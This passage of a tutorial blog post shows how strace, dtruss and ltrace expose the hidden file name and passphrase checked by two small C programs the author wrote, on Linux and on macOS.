&lt;p&gt;Compiling and running it (if you don’t want to use musl, just remove the &lt;code class=&quot;highlighter-rouge&quot;&gt;CC=musl-gcc&lt;/code&gt;), we get:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ CC=musl-gcc make linux
musl-gcc safe.c -o safe
$ ./safe
error: secret file is missing.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Why musl? Statically linking to musl instead of dynamically linking to your system &lt;code class=&quot;highlighter-rouge&quot;&gt;libc&lt;/code&gt; means that the program will need to do fewer syscalls at startup.&lt;/p&gt;

&lt;p&gt;So, what is the name of the file that it’s trying to access? That’s where &lt;a href=&quot;https://strace.io&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt;&lt;/a&gt; comes in! Basically, it intercepts and prints all syscalls that a program performs. That means we can sit back and watch what the program is doing — which files it is opening, what it is writing to those files, and much more. Here’s what strace tells me about my program when I run it on the Ubuntu machine:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ strace ./safe
execve(&quot;./safe&quot;, [&quot;./safe&quot;], [/* 23 vars */]) = 0
arch_prctl(ARCH_SET_FS, 0x7f0001204088) = 0
set_tid_address(0x7f00012040c0) = 8456
mprotect(0x7f0001202000, 4096, PROT_READ) = 0
mprotect(0x600000, 4096, PROT_READ) = 0
access(&quot;.IPSGNBIMHFCHAHMK&quot;, F_OK) = -1 ENOENT (No such file or directory)
writev(2, [{&quot;&quot;, 0}, {&quot;error: secret file is missing.\n&quot;, 31}], 2error: secret file is missing.
) = 31
exit_group(1) = ?
+++ exited with 1 +++
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Immediately you can see the &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt; syscall, with &lt;code class=&quot;highlighter-rouge&quot;&gt;.IPSGNBIMHFCHAHMK&lt;/code&gt;. That means the program is asking the kernel if a file with this name exists. The kernel replies with &lt;code class=&quot;highlighter-rouge&quot;&gt;ENOENT&lt;/code&gt;, meaning that it doesn’t. What if we created that file and ran the program again?&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ touch .IPSGNBIMHFCHAHMK
$ ./safe
congratulations!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; can be used to snoop on a program and watch what it’s doing to the system — all of the syscalls it does will be in the output.&lt;/p&gt;

&lt;h3 id=&quot;on-macos&quot;&gt;On MacOS&lt;/h3&gt;

&lt;p&gt;Compilation on macOS works basically the same way as it does on Linux — but now we won’t be able to use musl, since it’s not supported. Instead, we’ll compile as usual with:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ make safe
cc safe.c -o safe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Unfortunately, &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; itself doesn’t exist on macOS. That would be too easy, wouldn’t it? Instead, there is something else, called &lt;em&gt;dtrace&lt;/em&gt;, which is actually fairly comprehensive and complicated — there is &lt;a href=&quot;http://dtrace.org/guide/preface.html#preface&quot;&gt;a book&lt;/a&gt; on it, there are &lt;a href=&quot;https://8thlight.com/blog/colin-jones/2015/11/06/dtrace-even-better-than-strace-for-osx.html&quot;&gt;quite&lt;/a&gt; a &lt;a href=&quot;https://blog.wallaroolabs.com/2017/12/dynamic-tracing-a-pony---python-program-with-dtrace/&quot;&gt;few&lt;/a&gt; blog &lt;a href=&quot;https://hackernoon.com/running-a-process-for-exactly-ten-minutes-c6921f93a4a9&quot;&gt;posts&lt;/a&gt; about it, but don’t be intimidated yet.&lt;/p&gt;

&lt;p&gt;You don’t need to know all of &lt;code class=&quot;highlighter-rouge&quot;&gt;dtrace&lt;/code&gt; to be able to use it, all you need to know is which fontends do what. And the &lt;code class=&quot;highlighter-rouge&quot;&gt;dtruss&lt;/code&gt; font-end happens to do basically the same as &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt;, meaning that it’ll show you which syscalls a binary performs. Let’s try it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ dtruss ./safe
dtrace: failed to initialize dtrace: DTrace requires additional privileges
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Well, &lt;code class=&quot;highlighter-rouge&quot;&gt;dtrace&lt;/code&gt; doesn’t work the same way as &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; does, in spite of their similar naming. While &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; just politely asks the kernel to monitor a process, &lt;code class=&quot;highlighter-rouge&quot;&gt;dtrace&lt;/code&gt; hooks directly into the kernel, meaning that you potentially have access to every secret of every user, and you can actually break things (if you try really, &lt;em&gt;really&lt;/em&gt; hard). Needless to say, &lt;code class=&quot;highlighter-rouge&quot;&gt;dtrace&lt;/code&gt; and any related tools require &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; privileges to use.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo dtruss ./safe | tail -n 10
issetugid(0x101B2F000, 0x88, 0x1) = 0 0
getpid(0x101B2F000, 0x88, 0x1) = 38431 0
stat64(&quot;/AppleInternal/XBS/.isChrooted\0&quot;, 0x7FFF5E0D9D48, 0x1) = -1 Err#2
stat64(&quot;/AppleInternal\0&quot;, 0x7FFF5E0D9CB8, 0x1) = -1 Err#2
csops(0x961F, 0x7, 0x7FFF5E0D97D0) = -1 Err#22
sysctl(0x7FFF5E0D9B90, 0x4, 0x7FFF5E0D9908) = 0 0
csops(0x961F, 0x7, 0x7FFF5E0D90C0) = -1 Err#22
proc_info(0x2, 0x961F, 0x11) = 56 0
access(&quot;.IPSGNBIMHFCHAHMK\0&quot;, 0x0, 0x11) = -1 Err#2
write_nocancel(0x2, &quot;error: secret file is missing.\n\0&quot;, 0x1F) = 31 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you don’t pipe the output through &lt;code class=&quot;highlighter-rouge&quot;&gt;tail&lt;/code&gt; (which you can try, if you are curious), you’ll get a lot of noise from the system setup routines, which we aren’t really interested in at this point. And just like in the &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; example on Linux, we can see the &lt;code class=&quot;highlighter-rouge&quot;&gt;access&lt;/code&gt; system call! With that information, the binary can be made to run on macOS, too:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ touch .IPSGNBIMHFCHAHMK
$ ./safe
congratulations!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There’s just one little gotcha with dtrace, or rather with macOS: You can’t, by default, trace builtin utilities, eg. anything in &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo dtruss /bin/ls
dtrace: failed to execute pp: dtrace cannot control executables signed with restricted entitlements
$ sudo dtruss /usr/bin/git
dtrace: failed to execute pp: dtrace cannot control executables signed with restricted entitlements
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;What is going on there? This has something to do with the &lt;em&gt;System Integrity Protection&lt;/em&gt; that Apple introduced. Apparently, there are a few things &lt;a href=&quot;https://8thlight.com/blog/colin-jones/2017/02/02/dtrace-gotchas-on-osx.html&quot;&gt;not working under SIP&lt;/a&gt;. The only workaround that seems to be working for me is to manually copy whatever you are trying to trace to a different folder, like so:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cp `/usr/bin/which ls` .
$ sudo dtruss ./ls | tail -n 10
getdirentries64(0x5, 0x7FD761001000, 0x1000) = 392 0
getdirentries64(0x5, 0x7FD761001000, 0x1000) = 0 0
close_nocancel(0x5) = 0 0
fchdir(0x4, 0x7FD761001000, 0x1000) = 0 0
close_nocancel(0x4) = 0 0
fstat64(0x1, 0x7FFF56D61AB8, 0x1000) = 0 0
fchdir(0x3, 0x7FFF56D61AB8, 0x1000) = 0 0
close_nocancel(0x3) = 0 0
write_nocancel(0x1, &quot;.git\n.gitignore\nMakefile\nls\npass.c\nsafe\nsafe.c\ntracing-linux-macos.lit.md\ntracing-linux-macos.md\n\004\b\0&quot;, 0x61) = 97 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;tracing-library-calls&quot;&gt;Tracing library calls&lt;/h2&gt;

&lt;p&gt;What if we are not interested in syscalls, but we’d much rather know what calls a program does to a library, like the standard library or &lt;code class=&quot;highlighter-rouge&quot;&gt;zlib&lt;/code&gt;? Let’s have a look at this little program right here. It taks a passphrase as argument, checks if the passphrase is correct, and returns a message depending that check.&lt;/p&gt;

&lt;h6 id=&quot;file-passc-lines-036&quot;&gt;File pass.c, lines 0–36:&lt;/h6&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include 
#include 
#include 
#include
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passphrase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;218&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;204&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;206&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;203&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;204&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;169&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;205&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;102&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;204&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;uncompress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphrase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;error: no passphrase provided.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;error: wrong passphrase.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;congratulations!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once again we need to add a target to the &lt;code class=&quot;highlighter-rouge&quot;&gt;Makefile&lt;/code&gt; for this:
We’ll need to add a target to the &lt;code class=&quot;highlighter-rouge&quot;&gt;Makefile&lt;/code&gt; to be able to compile this.&lt;/p&gt;

&lt;h6 id=&quot;file-makefile-lines-23&quot;&gt;File Makefile, lines 2–3:&lt;/h6&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;all: pass
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since this program needs to be linked with &lt;code class=&quot;highlighter-rouge&quot;&gt;zlib&lt;/code&gt;, we’ll have to tell make about that, too:&lt;/p&gt;

&lt;h6 id=&quot;file-makefile-lines-2933&quot;&gt;File Makefile, lines 29–33:&lt;/h6&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# compile 'pass' and link libz.
pass: LDFLAGS += -lz
pass: pass.o
$(CC) -o $@ $&amp;lt; $(LDFLAGS)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;on-linux-1&quot;&gt;On Linux&lt;/h3&gt;

&lt;p&gt;To get this example to compile under ubuntu, it needs &lt;code class=&quot;highlighter-rouge&quot;&gt;zlib&lt;/code&gt;. If zlib isn’t installed already, just install it with&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ apt install libz-dev
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next, we can go right ahead and compile everything using the rule we just created.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ make pass
cc -c -o pass.o pass.c
cc -o pass pass.o -lz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When we run &lt;code class=&quot;highlighter-rouge&quot;&gt;pass&lt;/code&gt;, we will see that it doesn’t work:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./pass
error: no passphrase provided.

$ ./pass &quot;a passphrase&quot;
error: wrong passphrase.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Oh well. What now? &lt;code class=&quot;highlighter-rouge&quot;&gt;ltrace&lt;/code&gt; to the rescue! Similar idea as &lt;code class=&quot;highlighter-rouge&quot;&gt;strace&lt;/code&gt; — but instead of snooping on the syscalls the binary does, we’ll silently record and spit out all the library calls it does. That includes both &lt;code class=&quot;highlighter-rouge&quot;&gt;zlib&lt;/code&gt; library calls and &lt;code class=&quot;highlighter-rouge&quot;&gt;libc&lt;/code&gt; library calls!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ltrace ./pass
__libc_start_main(0x4008ba, 1, 0x7fff82c4d0a8, 0x400950
fwrite(&quot;error: no passphrase provided.\n&quot;, 1, 31, 0x7f0a7c7cd540error: no passphrase provided.
) = 31
+++ exited (status 1) +++
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Oh well. That’s not terribly useful, is it? I guess we should give it a (wrong) passphrase to see what it does.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ltrace ./pass &quot;a passphrase&quot;
__libc_start_main(0x4008ba, 2, 0x7ffe3c481eb8, 0x400950
uncompress(0x7ffe3c481d00, 0x7ffe3c481d58, 0x7ffe3c481d70, 40) = 0
strcmp(&quot;peanuts are technically legumes&quot;, &quot;a passphrase&quot;) = 15
fwrite(&quot;error: wrong passphrase.\n&quot;, 1, 25, 0x7f47cb184540error: wrong passphrase.
) = 25
+++ exited (status 1) +++
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, the program output is a little bit mangled with the &lt;code class=&quot;highlighter-rouge&quot;&gt;ltrace&lt;/code&gt; output, for this example it’s fine because we can still see what’s going on, but you can tell ltrace to dump it’s output to a file. You can also filter which calls or which libraries it should trace, it has a bunch of useful options. But what we are looking for is there already and very visible, from the &lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp&lt;/code&gt; call we can see that it’s comparing the string that we passed as argument with &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;peanuts are technically legumes&quot;&lt;/code&gt;. It seems like that is the string it’s looking for — let’s have a look:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./pass &quot;peanuts are technically legumes&quot;
congratulations!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That was easy, wasn’t it?&lt;/p&gt;

&lt;h3 id=&quot;on-macos-1&quot;&gt;On MacOS&lt;/h3&gt;

&lt;p&gt;Compiling this under macOS is exactly the same as under Linux, with&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ make pass
cc -c -o pass.o pass.c
cc -o pass pass.o -lz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, once again we don’t have &lt;code class=&quot;highlighter-rouge&quot;&gt;ltrace&lt;/code&gt; on macOS. And there isn’t really a direct equivalent to it — this is the part where we have to play around with dtrace. It took me a while to figure this out. Thankfully, there were a few useful &lt;a href=&quot;https://www.joyent.com/blog/bruning-questions-debugging&quot;&gt;articles&lt;/a&gt; and obviously, the &lt;a href=&quot;http://dtrace.org/guide/preface.html#preface&quot;&gt;book&lt;/a&gt;.&lt;/p&gt;

